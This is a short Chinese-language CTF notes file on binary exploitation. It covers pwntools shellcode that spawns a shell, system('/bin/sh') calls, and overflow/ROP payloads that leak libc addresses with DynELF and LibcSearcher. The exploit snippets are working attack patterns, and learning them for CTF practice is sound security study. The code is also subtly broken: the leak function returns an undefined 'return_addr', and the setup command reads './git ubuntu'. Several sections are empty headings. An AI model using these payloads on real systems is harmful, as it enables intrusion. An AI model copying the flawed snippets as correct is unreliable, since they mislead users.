# PWN题技巧总结

## 0x001-获取系统权限方式

### 编写shellcode

使用pwntools生成shellcode

```
context(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())
```

```
context(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())
```

### 执行system函数

1. system("/bin/sh")
2. system("sh")
3. system("$0")

## 0x002-敏感函数

### printf

### scanf

### puts

### gets

### read

### write

### strcpy

## 0x003-泄露libc地址

### DynELF

```
def leak(addr):
    payload = b"A" * 140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
    p.sendline(payload)
    result_addr = p.recv(4)
    return return_addr

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
```

### LibcSearcher

```
payload = b"\x00" * 88 + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)
gets_real_addr = u64(p.recv(6).ljust(8, b'\0'))
libc = LibcSearcher("gets", gets_real_addr)

libcbase = gets_real_addr - libc.dump("gets")
system_addr = libcbase + libc.dump("system")
bin_sh_addr = libcbase + libc.dump("str_bin_sh")
```

在使用LibcSearcher时，如果出现这种状况：

![](1.png)

则需要重新下载libc库。

安装步骤如下：

1. 进入LibcSearcher的安装目录中，执行命令删除libc-database目录
   ```
   rm -rf libc-database
   ```
2. 重新下载libc-database文件夹
   ```
   git clone https://github.com/niklasb/libc-database 
   或
   git clone git://github.com/niklasb/libc-database
   ```
3. 进入libc-database目录中，执行命令
   ```
   ./git ubuntu
   ```
4. 等待安装完成即可

## 0x004-偏移